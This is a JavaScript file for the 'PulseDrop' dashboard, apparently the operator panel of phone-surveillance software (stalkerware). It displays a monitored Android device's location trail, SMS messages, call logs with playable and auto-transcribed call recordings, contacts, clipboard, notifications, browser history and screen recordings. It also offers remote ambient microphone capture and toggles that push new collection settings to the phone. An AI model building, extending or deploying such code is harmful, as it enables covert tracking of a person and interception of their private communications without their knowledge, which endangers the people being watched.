// PulseDrop Dashboard — main application logic

let currentDevice = null;
let map = null;
let markers = [];
let currentAudioFileId = null;
let ws = null;

const TOGGLE_DEFS = [
    { key: 'location', label: 'Location Tracking', desc: 'GPS/Network location, periodic upload, history' },
    { key: 'geofence', label: 'Geofence Alerts', desc: 'Notify when device enters/leaves zones' },
    { key: 'sms', label: 'SMS Logs', desc: 'Read and upload SMS inbox/sent' },
    { key: 'callLog', label: 'Call Logs', desc: 'Incoming/outgoing/missed calls with timestamps' },
    { key: 'callRecording', label: 'Call Recording', desc: 'Auto-record phone calls (requires RECORD_AUDIO)' },
    { key: 'contacts', label: 'Contacts', desc: 'Upload contact list' },
    { key: 'media', label: 'Media Gallery', desc: 'Access photos/videos metadata' },
    { key: 'microphone', label: 'Ambient Audio', desc: 'Remote microphone recording' },
    { key: 'deviceInfo', label: 'Device Info', desc: 'Battery, network, WiFi, IP, model, SIM status' },
    { key: 'browserHistory', label: 'Browser History', desc: 'Default browser history & bookmarks' },
    { key: 'appList', label: 'App List', desc: 'Installed apps + install/uninstall events' },
    { key: 'clipboard', label: 'Clipboard', desc: 'Monitor clipboard changes' },
    { key: 'notifications', label: 'Notifications', desc: 'Capture notifications from other apps' },
    { key: 'accessibility', label: 'Accessibility Reading', desc: 'Read on-screen text (shows system warning)' },
    { key: 'screenRecording', label: 'Screen Recording', desc: 'Remote screen capture at native refresh rate' }
];

// ============ Init ============
document.addEventListener('DOMContentLoaded', async () => {
    // Check auth
    const authRes = await fetch('/api/auth-status');
    const auth = await authRes.json();
    if (!auth.authenticated) {
        window.location.href = '/login.html';
        return;
    }

    setupNavigation();
    await loadDevices();
    connectWebSocket();
    setInterval(pollStatus, 10000);
});

function setupNavigation() {
    document.querySelectorAll('.nav-item').forEach(item => {
        item.addEventListener('click', () => {
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
            item.classList.add('active');
            const tab = item.dataset.tab;
            document.getElementById('tab-' + tab).classList.add('active');
            if (tab !== 'overview' && tab !== 'remote' && tab !== 'toggles' && tab !== 'settings') {
                loadTab(tab);
            }
            if (tab === 'location') initMap();
            if (tab === 'toggles') loadToggles();
            if (tab === 'overview') loadOverview();
            if (tab === 'device-status') loadDeviceStatus();
            if (tab === 'screen-recordings') loadScreenRecordings();
        });
    });
}

// ============ Devices ============
async function loadDevices() {
    const res = await fetch('/api/devices');
    const devices = await res.json();
    const select = document.getElementById('deviceSelect');
    select.innerHTML = '';

    if (devices.length === 0) {
        select.innerHTML = '<option>No devices registered</option>';
        return;
    }

    devices.forEach(d => {
        const opt = document.createElement('option');
        opt.value = d.device_id;
        opt.textContent = d.device_id;
        select.appendChild(opt);
    });

    currentDevice = devices[0].device_id;
    select.value = currentDevice;
    updateStatusBadge(devices[0].online);

    select.addEventListener('change', () => {
        currentDevice = select.value;
        const dev = devices.find(d => d.device_id === currentDevice);
        updateStatusBadge(dev ? dev.online : false);
        loadOverview();
    });

    loadOverview();
}

function updateStatusBadge(online) {
    const badge = document.getElementById('statusBadge');
    badge.textContent = online ? 'Online' : 'Offline';
    badge.className = 'status-badge ' + (online ? 'status-online' : 'status-offline');
}

async function pollStatus() {
    if (!currentDevice) return;
    const res = await fetch('/api/devices');
    const devices = await res.json();
    const dev = devices.find(d => d.device_id === currentDevice);
    if (dev) updateStatusBadge(dev.online);
}

// ============ WebSocket ============
function connectWebSocket() {
    const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
    ws = new WebSocket(`${proto}//${location.host}/ws?role=dashboard`);
    ws.onmessage = (event) => {
        try {
            const msg = JSON.parse(event.data);
            if (msg.type === 'device_status') {
                if (msg.device_id === currentDevice) updateStatusBadge(msg.status === 'online');
            } else if (msg.type === 'command_response') {
                document.getElementById('commandResponse').textContent =
                    JSON.stringify(msg.data, null, 2);
            }
        } catch (e) { /* ignore */ }
    };
}

// ============ Data Loading ============
async function fetchData(type, deviceId = currentDevice, limit = 500) {
    const params = new URLSearchParams();
    if (deviceId) params.set('device_id', deviceId);
    params.set('limit', limit);
    const res = await fetch(`/api/data/${type}?${params}`);
    return res.json();
}

async function loadTab(tab) {
    if (!currentDevice) return;
    switch (tab) {
        case 'sms': loadSms(); break;
        case 'calls': loadCalls(); break;
        case 'contacts': loadContacts(); break;
        case 'media': loadMedia(); break;
        case 'apps': loadApps(); break;
        case 'notifications': loadNotifications(); break;
        case 'clipboard': loadClipboard(); break;
        case 'browser-history': loadBrowserHistory(); break;
        case 'browser-bookmarks': loadBrowserBookmarks(); break;
        case 'geofence': loadGeofence(); break;
        case 'location': loadLocation(); break;
    }
}

function fmtTime(ts) {
    if (!ts) return '-';
    return new Date(ts).toLocaleString();
}

function fmtDuration(sec) {
    const m = Math.floor(sec / 60);
    const s = sec % 60;
    return `${m}:${s.toString().padStart(2, '0')}`;
}

function fmtSize(bytes) {
    if (bytes < 1024) return bytes + ' B';
    if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
    return (bytes / 1048576).toFixed(1) + ' MB';
}

// ============ Overview ============
async function loadOverview() {
    if (!currentDevice) return;
    const types = ['locations', 'sms', 'calls', 'contacts', 'apps', 'notifications', 'clipboard'];
    const labels = { locations: 'Locations', sms: 'SMS', calls: 'Calls', contacts: 'Contacts', apps: 'Apps', notifications: 'Notifications', clipboard: 'Clipboard' };

    const grid = document.getElementById('overviewStats');
    grid.innerHTML = '';

    for (const type of types) {
        const data = await fetchData(type, currentDevice, 1);
        grid.innerHTML += `
            <div class="info-item">
                <div class="label">${labels[type]}</div>
                <div class="value">${data.length > 0 ? 'Available' : 'No data'}</div>
            </div>`;
    }

    // Recent activity = latest device info
    const info = await fetch('/api/device-info/latest?device_id=' + currentDevice).then(r => r.json());
    const activity = document.getElementById('recentActivity');
    if (info) {
        activity.innerHTML = `
            <table class="data-table">
                <tr><td>Battery</td><td>${info.battery_level}% ${info.is_charging ? '(charging)' : ''}</td></tr>
                <tr><td>Network</td><td>${info.network_type} ${info.wifi_ssid ? '(' + info.wifi_ssid + ')' : ''}</td></tr>
                <tr><td>Device</td><td>${info.manufacturer} ${info.device_model} — Android ${info.os_version}</td></tr>
                <tr><td>SIM</td><td>${info.sim_status} ${info.sim_operator || ''}</td></tr>
                <tr><td>Last Seen</td><td>${fmtTime(info.timestamp)}</td></tr>
            </table>`;
    } else {
        activity.innerHTML = '<p style="color:var(--text-dim);">No device data yet.</p>';
    }

    // Check SIM changes
    const simChanges = await fetchData('sim-changes', currentDevice, 5);
    if (simChanges.length > 0) {
        const latest = simChanges[0];
        document.getElementById('simAlertText').textContent =
            `From "${latest.previous_operator || 'none'}" to "${latest.new_operator || 'none'}" at ${fmtTime(latest.timestamp)}`;
        document.getElementById('simAlert').style.display = 'flex';
    }
}

// ============ Location / Map ============
function initMap() {
    if (map) return;
    map = L.map('map').setView([0, 0], 2);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        attribution: '© OpenStreetMap',
        maxZoom: 19
    }).addTo(map);
    loadLocation();
}

async function loadLocation() {
    if (!currentDevice) return;
    const locations = await fetchData('locations', currentDevice, 500);

    // Clear old markers
    markers.forEach(m => map.removeLayer(m));
    markers = [];

    if (locations.length === 0) return;

    const latlngs = [];
    locations.forEach((loc, i) => {
        const marker = L.circleMarker([loc.lat, loc.lon], {
            radius: 5,
            fillColor: i === 0 ? '#4caf50' : '#4f8cff',
            color: '#fff',
            weight: 1,
            opacity: 1,
            fillOpacity: 0.8
        }).addTo(map);
        marker.bindPopup(`<b>${fmtTime(loc.timestamp)}</b><br>Lat: ${loc.lat.toFixed(6)}<br>Lon: ${loc.lon.toFixed(6)}<br>Acc: ${loc.accuracy}m`);
        markers.push(marker);
        latlngs.push([loc.lat, loc.lon]);
    });

    // Draw path
    if (latlngs.length > 1) {
        L.polyline(latlngs.reverse(), { color: '#4f8cff', weight: 2, opacity: 0.6 }).addTo(map);
    }

    map.fitBounds(L.latLngBounds(latlngs).pad(0.1));

    // Table
    const tbody = document.querySelector('#locationTable tbody');
    tbody.innerHTML = locations.slice(0, 100).map(l => `
        <tr><td>${fmtTime(l.timestamp)}</td><td>${l.lat.toFixed(6)}</td><td>${l.lon.toFixed(6)}</td><td>${l.accuracy}m</td><td>${(l.speed * 3.6).toFixed(1)} km/h</td></tr>
    `).join('');
}

// ============ SMS ============
async function loadSms() {
    const data = await fetchData('sms');
    const tbody = document.querySelector('#smsTable tbody');
    tbody.innerHTML = data.map(s => `
        <tr>
            <td>${fmtTime(s.timestamp)}</td>
            <td><span class="btn btn-sm" style="${s.type === 'inbox' ? 'color:var(--accent)' : 'color:var(--green)'}">${s.type}</span></td>
            <td>${s.address}</td>
            <td class="truncate" title="${s.body}">${s.body}</td>
        </tr>
    `).join('');
}

// ============ Calls ============
async function loadCalls() {
    const data = await fetchData('calls');
    const files = await fetch('/api/files?type=call_recording&device_id=' + currentDevice).then(r => r.json());

    const tbody = document.querySelector('#callsTable tbody');
    tbody.innerHTML = data.map(c => {
        // Find matching recording file
        const recording = files.find(f => {
            const num = c.number.replace(/\D/g, '');
            return f.file_name.includes(num) && num.length > 3;
        });
        const recBtn = recording
            ? `<button class="btn btn-sm btn-primary" onclick="openAudioModal('${recording.id}', '${recording.file_name}', '${c.number}')">Play Recording</button>`
            : '<span style="color:var(--text-dim);">—</span>';

        const typeColor = c.type === 'incoming' ? 'var(--accent)' : c.type === 'outgoing' ? 'var(--green)' : 'var(--orange)';
        return `
        <tr>
            <td>${fmtTime(c.timestamp)}</td>
            <td style="color:${typeColor}">${c.type}</td>
            <td>${c.number}</td>
            <td>${c.contact_name || '—'}</td>
            <td>${fmtDuration(c.duration_seconds)}</td>
            <td>${recBtn}</td>
        </tr>`;
    }).join('');
}

// ============ Contacts ============
async function loadContacts() {
    const data = await fetchData('contacts');
    const tbody = document.querySelector('#contactsTable tbody');
    tbody.innerHTML = data.map(c => {
        let phones = [], emails = [];
        try { phones = JSON.parse(c.phone_numbers || '[]'); } catch (e) {}
        try { emails = JSON.parse(c.emails || '[]'); } catch (e) {}
        return `
        <tr>
            <td>${c.name}</td>
            <td>${phones.join(', ') || '—'}</td>
            <td>${emails.join(', ') || '—'}</td>
        </tr>`;
    }).join('');
}

// ============ Media ============
async function loadMedia() {
    const data = await fetchData('media');
    const tbody = document.querySelector('#mediaTable tbody');
    tbody.innerHTML = data.map(m => `
        <tr>
            <td>${m.type}</td>
            <td class="truncate">${m.file_name}</td>
            <td>${fmtSize(m.size_bytes)}</td>
            <td>${fmtTime(m.timestamp)}</td>
        </tr>
    `).join('');
}

// ============ Device Status ============
async function loadDeviceStatus() {
    if (!currentDevice) return;
    const info = await fetch('/api/device-info/latest?device_id=' + currentDevice).then(r => r.json());
    const grid = document.getElementById('deviceInfoGrid');
    if (!info) {
        grid.innerHTML = '<p style="color:var(--text-dim);">No device info available.</p>';
        return;
    }
    const items = [
        ['Battery', `${info.battery_level}% ${info.is_charging ? '⚡ Charging' : ''}`],
        ['Network', info.network_type],
        ['WiFi', info.wifi_ssid || '—'],
        ['IP Address', info.ip_address],
        ['Device Model', `${info.manufacturer} ${info.device_model}`],
        ['Android Version', `${info.os_version} (SDK ${info.sdk_int})`],
        ['SIM Status', info.sim_status],
        ['SIM Operator', info.sim_operator || '—'],
        ['Last Update', fmtTime(info.timestamp)]
    ];
    grid.innerHTML = items.map(([label, value]) => `
        <div class="info-item">
            <div class="label">${label}</div>
            <div class="value">${value}</div>
        </div>
    `).join('');
}

// ============ Apps ============
async function loadApps() {
    const data = await fetchData('apps');
    const tbody = document.querySelector('#appsTable tbody');
    tbody.innerHTML = data.map(a => `
        <tr>
            <td>${a.app_name}</td>
            <td class="truncate">${a.package_name}</td>
            <td>${a.version_name || '—'}</td>
            <td>${a.is_system_app ? 'Yes' : 'No'}</td>
        </tr>
    `).join('');
}

// ============ Notifications ============
async function loadNotifications() {
    const data = await fetchData('notifications');
    const tbody = document.querySelector('#notificationsTable tbody');
    tbody.innerHTML = data.map(n => `
        <tr>
            <td>${fmtTime(n.timestamp)}</td>
            <td>${n.app_name}</td>
            <td class="truncate">${n.title || '—'}</td>
            <td class="truncate">${n.text || '—'}</td>
        </tr>
    `).join('');
}

// ============ Clipboard ============
async function loadClipboard() {
    const data = await fetchData('clipboard');
    const tbody = document.querySelector('#clipboardTable tbody');
    tbody.innerHTML = data.map(c => `
        <tr><td>${fmtTime(c.timestamp)}</td><td class="truncate" title="${c.text}">${c.text}</td></tr>
    `).join('');
}

// ============ Browser ============
async function loadBrowserHistory() {
    const data = await fetchData('browser-history');
    const tbody = document.querySelector('#browserTable tbody');
    tbody.innerHTML = data.map(b => `
        <tr>
            <td>${fmtTime(b.last_visited)}</td>
            <td class="truncate">${b.title || '—'}</td>
            <td class="truncate"><a href="${b.url}" target="_blank" style="color:var(--accent)">${b.url}</a></td>
            <td>${b.visits}</td>
        </tr>
    `).join('');
}

async function loadBrowserBookmarks() {
    const data = await fetchData('browser-bookmarks');
    const tbody = document.querySelector('#browserTable tbody');
    tbody.innerHTML = data.map(b => `
        <tr>
            <td>${fmtTime(b.created)}</td>
            <td class="truncate">${b.title || '—'}</td>
            <td class="truncate"><a href="${b.url}" target="_blank" style="color:var(--accent)">${b.url}</a></td>
            <td>—</td>
        </tr>
    `).join('');
}

// ============ Geofence ============
async function loadGeofence() {
    const data = await fetchData('geofence');
    const tbody = document.querySelector('#geofenceTable tbody');
    tbody.innerHTML = data.map(g => `
        <tr>
            <td>${fmtTime(g.timestamp)}</td>
            <td>${g.geofence_id}</td>
            <td style="color:${g.transition === 'enter' ? 'var(--green)' : 'var(--orange)'}">${g.transition}</td>
            <td>${g.lat.toFixed(6)}</td>
            <td>${g.lon.toFixed(6)}</td>
        </tr>
    `).join('');
}

// ============ Screen Recordings ============
async function loadScreenRecordings() {
    const files = await fetch('/api/files?type=screen_recording&device_id=' + currentDevice).then(r => r.json());
    const container = document.getElementById('screenRecordingsList');
    if (files.length === 0) {
        container.innerHTML = '<div class="card"><p style="color:var(--text-dim);">No screen recordings yet.</p></div>';
        return;
    }
    container.innerHTML = files.map(f => `
        <div class="card">
            <h3>${f.file_name}</h3>
            <p style="color:var(--text-dim);font-size:12px;margin-bottom:8px;">${fmtTime(f.timestamp)} — ${fmtSize(f.size_bytes)}</p>
            <video controls preload="metadata" style="max-height:400px;">
                <source src="/uploads/screen_recordings/${f.file_name}" type="video/mp4">
            </video>
        </div>
    `).join('');
}

// ============ Audio Modal ============
function openAudioModal(fileId, fileName, number) {
    currentAudioFileId = fileId;
    document.getElementById('audioModalTitle').textContent = `Call Recording — ${number}`;
    document.getElementById('audioPlayer').src = `/uploads/call_recordings/${fileName}`;
    document.getElementById('transcriptSection').style.display = 'none';
    document.getElementById('audioModal').classList.add('active');
}

function closeAudioModal() {
    document.getElementById('audioModal').classList.remove('active');
    document.getElementById('audioPlayer').pause();
}

async function transcribeCurrent() {
    if (!currentAudioFileId) return;
    const targetLang = document.getElementById('targetLang').value;
    const section = document.getElementById('transcriptSection');
    section.style.display = 'block';
    document.getElementById('transcriptText').textContent = 'Transcribing...';
    document.getElementById('translationText').textContent = '';

    try {
        const res = await fetch(`/api/transcribe/${currentAudioFileId}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ targetLang })
        });
        const data = await res.json();
        if (res.ok) {
            document.getElementById('transcriptText').textContent = data.transcript || '(no speech detected)';
            document.getElementById('transcriptLang').textContent = data.transcript_lang ? `[${data.transcript_lang}]` : '';
            document.getElementById('translationText').textContent = data.translation || '(translation not needed or unavailable)';
        } else {
            document.getElementById('transcriptText').textContent = 'Error: ' + (data.error || 'Transcription failed');
        }
    } catch (e) {
        document.getElementById('transcriptText').textContent = 'Error: ' + e.message;
    }
}

// ============ Remote Commands ============
async function sendCommand(command, payload = {}) {
    if (!currentDevice) { alert('No device selected'); return; }
    document.getElementById('commandResponse').textContent = 'Sending...';
    try {
        const res = await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ device_id: currentDevice, command, payload })
        });
        const data = await res.json();
        document.getElementById('commandResponse').textContent = JSON.stringify(data, null, 2);
    } catch (e) {
        document.getElementById('commandResponse').textContent = 'Error: ' + e.message;
    }
}

// ============ Feature Toggles ============
async function loadToggles() {
    const res = await fetch(`/api/toggles/${currentDevice}`);
    let toggles = await res.json();
    if (!toggles) {
        toggles = {};
        TOGGLE_DEFS.forEach(d => toggles[d.key] = false);
    }

    const container = document.getElementById('togglesList');
    container.innerHTML = TOGGLE_DEFS.map(d => `
        <div class="toggle-row">
            <div>
                <div class="toggle-label">${d.label}</div>
                <div class="toggle-desc">${d.desc}</div>
            </div>
            <label class="switch">
                <input type="checkbox" id="toggle_${d.key}" ${toggles[d.key] ? 'checked' : ''}>
                <span class="slider"></span>
            </label>
        </div>
    `).join('');
}

async function saveToggles() {
    const toggles = {};
    TOGGLE_DEFS.forEach(d => {
        toggles[d.key] = document.getElementById('toggle_' + d.key).checked;
    });
    const res = await fetch(`/api/toggles/${currentDevice}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(toggles)
    });
    const data = await res.json();
    alert(data.success ? 'Toggles saved and pushed to device.' : 'Failed to save toggles.');
}

// ============ Export / Delete ============
function exportData(type, format = 'json') {
    const params = new URLSearchParams();
    if (currentDevice) params.set('device_id', currentDevice);
    params.set('format', format);
    window.open(`/api/export/${type}?${params}`, '_blank');
}

async function deleteData(type) {
    if (!confirm(`Delete all ${type} data for ${currentDevice}? This cannot be undone.`)) return;
    const res = await fetch(`/api/data/${type}?device_id=${currentDevice}`, { method: 'DELETE' });
    const data = await res.json();
    if (data.success) {
        alert('Data deleted.');
        loadTab(type);
    }
}

function refreshAll() {
    loadOverview();
}

async function logout() {
    await fetch('/api/logout', { method: 'POST' });
    window.location.href = '/login.html';
}
